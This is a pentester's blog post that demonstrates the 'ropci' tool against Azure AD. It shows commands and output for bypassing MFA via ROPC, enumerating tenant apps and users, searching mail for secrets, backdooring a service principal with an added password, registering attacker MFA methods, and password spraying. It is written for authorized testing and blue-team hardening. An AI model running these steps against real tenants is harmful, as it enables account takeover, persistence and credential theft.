---
title: "Ropci deep-dive for Azure hackers"
date: 2022-11-20T18:00:00-07:00
draft: true
tags: [
        "pentest", "red","research","cloud","tool"
    ]   

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Ropci deep-dive for Azure hackers"
  description:  "Leverage ropci to pentest your Azure tenant!"
  image: "https://embracethered.com/blog/images/2022/ropci.png"
---

Misconfigurations with MFA setups are not uncommon when using AAD, especially when federated setups or Pass Through Authentication is configured I have seen MFA bypass opportunities in multiple production tenants. 

A common misconfiguration is that MFA is enforced at the federated identity provider, but AAD is forgotten and ROPC authentication still succeeds against AAD.

To learn more about ROPC, check out the [previous post about the topic](/blog/posts/2022/ropci-so-you-think-you-have-mfa-azure-ad/).

This post focuses on the `ropci` features that can be leveraged post-exploitation. 

## Getting ropci and abusing Microsoft Graph API

[Download a pre-built release for your platform of choice here](https://github.com/wunderwuzzi23/ropci/releases/tag/v0.1). 

Or compile it yourself as per the instructions on [Github](https://github.com/wunderwuzzi23/ropci).

## Getting an Access Token

First, run `ropci configure` to setup the environment. It requires tenant name, username and password.

Afterwards `./ropci auth logon` will get you an accesss token if ROPC auth is possible:

```
$ ./ropci auth logon 
Succeeded. Token written to .token.
```

* If this call succeeds, then then MFA is not enforced correctly. See more details about the attack avenue in the previous post about [ROPC, So you think you have MFA](/blog/posts/2022/ropci-so-you-think-you-have-mfa-azure-ad/)

* If authentication fails you will receive an error message, stating the AAD error that occured.

Its possible to provide a custom `client_id` by providing the `--clientid` argument - more about testing of specific apps later.

### Refreshing a Token

You can later also refresh a token by running `./ropci auth refresh`. This also allows you to import a refresh token from elsewhere via `./ropci auth refresh --refresh token {token}`.

### Device Code Support

To get an `access_token` via the devicecode flow you can leverage `./ropci auth deviceflow`.

This is useful if you want to play around with the other post-authentication features of ropci, or if you attempt to do some [phishing via Device Code based phishing attacks](/blog/posts/2022/device-code-phishing/).

## Gathering tenant data using ropci

By default `ropci` uses the Outlook app, which allows to perform a set of powerful operations:

* List all Users and Groups (`./ropci users` and `./ropci groups`)
* Reading email for the compromised account (`./ropci mail`)
* Reading and uploading files to SharePoint/OneDrive (`./ropci drive`)
* Using the search API to find secrets and other information ( `./ropci search`)

For instance, the `Microsoft Whiteboard Client` allows sending of emails via `./ropci mail send`. 

To switch to a different `clientid` the following command can be used:
```
./ropc auth logon --clientid 57336123-6e14-4acc-8dcf-287b6088aa28`.
```

## Basic info about a user 

Show some interesting info about a user (by default logged on user is used):

```
./ropci users who [-u joe@example.org]
```

This will list details about the user and group ownerships and group memberships.

## Enumerating and evaluating apps

In case you got an access token it is  a good idea to enumerate all the OAuth apps that are registered for a tenant. 

To do this for all OAuth2 apps (so called servicePrincipals in AAD) use `./ropci apps list`:

```
$ ./ropci apps list
+----------------------------------------------------------------+--------------------------------------+--------------------+
|                          displayName                           |                appId                 |   publisherName    |
+----------------------------------------------------------------+--------------------------------------+--------------------+
| Microsoft Teams Mailhook                                       | 51133ff5-8e0d-4078-bcca-84fb7f905b64 | Microsoft Services |
| OCaaS Client Interaction Service                               | c2ada927-a9e2-4564-aae2-70775a2fa0af | Microsoft Services |
| Microsoft Office Licensing Service vNext                       | db55028d-e5ba-420f-816a-d18c861aefdf | Microsoft Services |
| Messaging Bot API Application                                  | 5a807f24-c9de-44ee-a3a7-329e88a00ffc | Microsoft Services |
| Service Encryption                                             | dbc36ae1-c097-4df9-8d94-343c3d091a76 | Microsoft Services |
| Microsoft Mobile Application Management Backend                | 354b5b6d-abd6-4736-9f51-1be80049b91f | Microsoft Services |
| Microsoft Graph                                                | 00000003-0000-0000-c000-000000000000 | Microsoft Services |
| Permission Service O365                                        | 6d32b7f8-782e-43e0-ac47-aaad9f4eb839 | Microsoft Services |
| SubscriptionRP                                                 | e3335adb-5ca0-40dc-b8d3-bedc094e523b | Microsoft Services |
.....
```

There are likely more then 100 apps in your tenant. `ropci` will only show you 100 entries by default. Use the `--all` argument when calling the command to list everything, you can also output all the details as `json`. 

```
./ropci apps list --all --format json -o apps.json
```

## Perform a bulk authentication validation 

To test all your applications: 

1. Dump all the apps and write them to a csv file (using `./ropci apps list`)
2. Perform an ROPC based logon for each of them to see which one allow ROPC (using `./ropci auth bulk`)

These are the commands:

```
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o output.json
```

Here is an example:

```
$ ./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
$ ./ropci auth bulk -i apps.csv -o results.json
ClientIDs from CSV file apps.csv.
Results will be written to results.json.

Issuing Requests...~420
Waiting for results...
+------------------------------------------+--------------------------------------+---------+-----------------------------------+
|               displayName                |                appId                 | result  |               scope               |
+------------------------------------------+--------------------------------------+---------+-----------------------------------+
| Microsoft Teams ATP Service              | 0fa37baf-7afc-4baf-ab2d-d5bb891d53ef | error   |                                   |
| Microsoft Dynamics CRM                   | 2db8cb1d-fb6c-450b-ab09-49b6ae35186b | error   |                                   |
| Microsoft Outlook                        | 5d661950-3475-41cd-a2c3-d671a3162bc1 | success | email openid profile              |
|                                          |                                      |         | AuditLog.Create Chat.Read         |
|                                          |                                      |         | DataLossPreventionPolicy.Evaluate |
|                                          |                                      |         | Directory.Read.All                |
|                                          |                                      |         | EduRoster.ReadBasic               |
|                                          |                                      |         | Files.ReadWrite.All               |
|                                          |                                      |         | Group.ReadWrite.All               |
|                                          |                                      |         | InformationProtectionPolicy.Read  |
|                                          |                                      |         | OnlineMeetings.Read People.Read   |
|                                          |                                      |         | SensitiveInfoType.Detect          |
|                                          |                                      |         | SensitiveInfoType.Read.All        |
|                                          |                                      |         | SensitivityLabel.Evaluate         |
|                                          |                                      |         | User.Invite.All User.Read         |
|                                          |                                      |         | User.ReadBasic.All                |
| Service                                  |                                      |         |                                   |
| PushChannel                              | 4747d38e-36c5-4bc3-979b-b0ef74df54d1 | error   |                                   |
| Microsoft.MileIQ                         | a25dbca8-4e60-48e5-80a2-0664fdb5c9b6 | success | profile openid email              |
|                                          |                                      |         | user_impersonation                |
| Storage Resource Provider                | a6aa9161-5291-40bb-8c5c-923b567bee3b | error   |                                   |
...
+------------------------------------------+--------------------------------------+---------+-----------------------------------+

Done. 
You could now run the following command to analyze valid tokens and there scopes:
$ cat results.json | jq -r 'select (.access_token!="") | [.display_name,.scope] | @csv'
Happy Hacking.
```

This gives you an idea which applications support ROPC and what permissions they have that an adversary could abuse. 
The result file will already contain the retrieved `access_tokens` from each app.

It's also a good list for the IT admins and blue team to monitor and lock down.



## Search the user's mail messages

By default the following searches for the word `password`:

```
./ropci search
```

But you can specify a custom query with `-q`. Here is an example:

```
 ./ropci search -q 'AWS_ACCESS' -f rank -f summary
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
| rank |                                                        summary                                                                                            |
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
|    1 | ...is not known. <c0>AWS_ACCESS</c0>_KEY_ID=AKIAsomethingsomething AWS_SECRET_ACCESS_KEY=this_is_a_secret This grants you access to the EC2 instance and 
you can create s3 data. Greetings,Security.                                                                                                                        |
+------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+

Number of items: 1
```

Pretty neat. 

You can also search for other items, like Sharepoint listItems, etc.. by specifying `-t` and the type.

## List all groups

```
./ropci groups list --format json -o groups.json
cat groups.json | jq -r '.value[].id'
```


## List members/owners of a groups

To list the members of a group, first get the groupid via the previous group list command, then run:

```
./ropci groups members-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
+--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
|                  id                  |   displayName    |    userPrincipalName    | givenName |  surname  | department | jobTitle | accountEnabled |
+--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
| 838ccee5-c96d-4555-854b-913d5da07fbd | John             | john@example.org        | John      | Tester |            |          | true           |
| 07537a19-e926-4591-a949-361f7ab97f93 | Bobby            | bob@example.org         | Bob       | Williams  | Security   | Analyst  | true           |
+--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+

Number of items: 2
```

Similar command exists for owernship checks via `./ropci groups owners-list`.

## Add an owner to a group 

List or add an owner of a group:

```
./ropci groups owner-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
./ropci groups owner-add -u 0df463da-1a1c-4dba-817d-ca72438524ce -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
```

Removing works also.

## Search for users/groups:

```
./ropci users list -s userPrincipalName:bob
```

## Upload a file to SharePoint

Uploading a file to SharePoint drive:

```
./ropci drive upload -p "/Tom @ ExampleOrg, LLC/testing.txt" -d ./ropci -v
```

## Read mail in text form 

The following command will show some basic info about the accounts inbox:
```
./ropci mail list
```

Read mail body.content in text form:

```
 ./ropci mail list --format json | jq .value[].body.content
```



## Invalidate Refresh Tokens

This is quite important in order to protect yourself:

```
./ropci auth invalidate
```

Which basically calls `/me/invalidateAllRefreshTokens`:

```
./ropci call -c /me/invalidateAllRefreshTokens --verb POST
```

If you try to refresh now with `./ropci auth refresh` the following error will be shown:

```
AADSTS50173: The provided grant has expired due to it being revoked, a fresh auth token is needed. The user might have changed or reset their password. The grant was issued on '2022-09-05T18:48:10.7367392Z' and the TokensValidFrom date (before which tokens are not valid) for this user is '2022-09-05T18:48:54.0000000Z'
```

Refresh tokens have been invalidated for the logged on user. If the account has the right permissions one can also call `/users/username@expample.org/invalidateAllRefreshTokens` to invalidate refresh tokens of another account.

## Application Role Assignments of a user

[Graph API Documentatin](https://docs.microsoft.com/en-us/graph/api/user-list-approleassignments?view=graph-rest-beta&tabs=http)

```
./ropci call -c /users/user@example.org/appRoleAssignments -f id -f principalDisplayName -f resourceDisplayName -f resourceId
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
|                     id                      | principalDisplayName |   resourceDisplayName   |              resourceId              |
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
| 5c6Mg23JVUWFS5E9XaB_vQObgianBrBMugogPRfMvYU | Vera Mitchell        | Apple Internet Accounts | 36559af8-a122-4101-b6c7-adccfa24506d |
| 5c6Mg23JVUWFS5E9XaB_vUG-XjOYoexCm4D9r2fYwxI | Vera Mitchell        | Graph Explorer          | f3ff1808-52d0-4516-b090-28a06cd24783 |
| 5c6Mg23JVUWFS5E9XaB_vaBGH-RIpJRMuE0qYZ7s5ZE | Vera Mitchell        | AppForHealthServices    | 48359af7-af3a-42d4-abe2-8425a14689c9 |
+---------------------------------------------+----------------------+-------------------------+--------------------------------------+
```

## Backdooring a Service Principal (adding additional password)

```
$ ./ropci call -c /servicePrincipals/48359af7-af3a-42d4-abe2-8425a14689c9/addPassword \ 
--verb POST  -b '{"passwordCredential": { "displayName": "ropci says this is fine"}} | jq

{
  "@odata.context": "https://graph.microsoft.com/beta/$metadata#servicePrincipals('48359af7-af3a-42d4-abe2-8425a14689c9')/addPassword",
  "@odata.type": "#microsoft.graph.servicePrincipal",
  "customKeyIdentifier": null,
  "endDateTime": "2024-09-05T19:48:11.1638864Z",
  "keyId": "c47e91ff-986c-4f8f-9cc0-d41bdd038d49",
  "startDateTime": "2022-09-05T19:48:11.1638864Z",
  "secretText": "Yhj8Q~H1np.....4iEGuf0djD",
  "hint": "Yhj",
  "displayName": "ropci says this is fine"
}
```

Take note of the response, and the `secretText`. This is what can be used to impersonate the service principal.

With that `secretText`, which is the `client_secret` you can get an access token via the OAuth2 `client_credential` flow:

```
curl -d 'grant_type=client_credentials&client_id=2581d8b8-2e9c-4374-a418-06f9cfed87ff&client_secret=Yhj8Q~H1np.....4iEGuf0djD&scope=https://graph.microsoft.com/.default' https://login.microsoftonline.com/wuzzi.onmicrosoft.com/oauth2/v2.0/token
```

Fun times!

## More useful recon commands

### Chats

```
./ropci call -c /me/chats
```

### Searching for other items (e.g person)

```
./ropci search -t person -q "ropci" --format json  | jq
```

## Generic call method

The `call` command allows to invoke the many other APIs that are exposed. Here are a couple of interesting examples:

```
./ropci call -c /domains --format json -o domains.json
./ropci call -c /domains/{tenant}}/verificationDnsRecords --format json -o verificationDnsRecords-domain1.json
./ropci call -c /organization --format json -o organization.json
./ropci call -c /identity/conditionalAccess/policies --format json -o conditionalAccess-Policies.json
```

```
./ropci call -c '/identity/b2cUserFlows/B2C_test_signin_signup/userflowIdentityProviders'
```

### Explore authentication methods

```
./ropci auth logon --clientid 27922004-5251-4030-b22d-91ecd9a37ea4 # Use Outlook Mobile clientID
./ropci call -c '/me/authentication/methods' -f id -f  emailAddress --format json | jq

./ropci call -c '/me/authentication/phoneMethods' -f id -f phoneNumber -f phoneType
./ropci call -c '/me/authentication/emailMethods' -f id -f emailAddress

./ropci call -c '/me/authentication/phoneMethods' --verb POST -b '{"phoneNumber": "+1 5558008000","phoneType": "mobile"}'
./ropci call -c '/me/authentication/emailMethods' --verb POST -b '{"emailAddress": "joe@example.org"}'
```

### List deleted users or other deleted items

When an object (e.g. user account) is deleted, it's not entirely deleted right away. It's possible to restore them within 30 days.
The following command lists the delete users:

```
./ropci call -c /directory/deletedItems/microsoft.graph.user
+--------------------------------------+-------------+------+
|                  id                  | displayName | name |
+--------------------------------------+-------------+------+
| e94d329b-ec6a-41fa-923c-fcd0eab5b12e | John Ropci  |      |
| ea9f55dc-f38b-4344-8731-a97454778094 | Ropci       |      |
+--------------------------------------+-------------+------+
```

## Password Spraying

ropci also comes with the ability to perform an ROPC based password spray.

```
./ropci auth spray --users-file users.list --passwords-file passwords.list -o result --wait 60 --wait-try 10 
Attempts: 12 for ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c

Attempt 0001: alice@wunderwuzzi.net                     test1242355                     invalid username or password
Attempt 0002: tom@wunderwuzzi.net                       test123                         invalid username or password
Attempt 0003: doesnotexist@wunderwuzzi.net              test1242355                     account does not exist
Attempt 0004: tom@wunderwuzzi.net                       test1242355                     invalid username or password
Attempt 0005: tom@wunderwuzzi.net                       Sommer2022!                     invalid username or password
Attempt 0006: doesnotexist@wunderwuzzi.net              Sommer2022!                     account does not exist
Attempt 0007: alice@wunderwuzzi.net                     test                            invalid username or password
Attempt 0008: alice@wunderwuzzi.net                     test123                         invalid username or password
Attempt 0009: doesnotexist@wunderwuzzi.net              test123                         account does not exist
Attempt 0010: alice@wunderwuzzi.net                     Sommer2022!                     success
Attempt 0011: doesnotexist@wunderwuzzi.net              test                            account does not exist
Attempt 0012: tom@wunderwuzzi.net                       test                            invalid username or password
```

Be aware of any account lockout policies, and make sure you have proper authorization before engaging in such testing.

There is a lot more to explore. Hope this was helpful.

Cheers!

## Disclaimer

Pentesting and security assessments require authorization from proper stakeholders. Do not do anything illegal.


## References and further reading material

* [AADInternals by @DrAzureAD](https://o365blog.com/aadinternals)
* [Abusing Family Refresh Tokens by SecureWorks](https://github.com/secureworks/family-of-client-ids-research)
* Other interesting tooling: [ROADTools](https://github.com/dirkjanm/ROADtools), [TeamFiltration](https://github.com/Flangvik/TeamFiltration)
* [Microsoft Graph API](https://learn.microsoft.com/en-us/graph/)
* [OAuth RFC](https://www.rfc-editor.org/rfc/rfc6749.html)
* [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#page-9)
* [Microsoft ROPC docs](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth-ropc)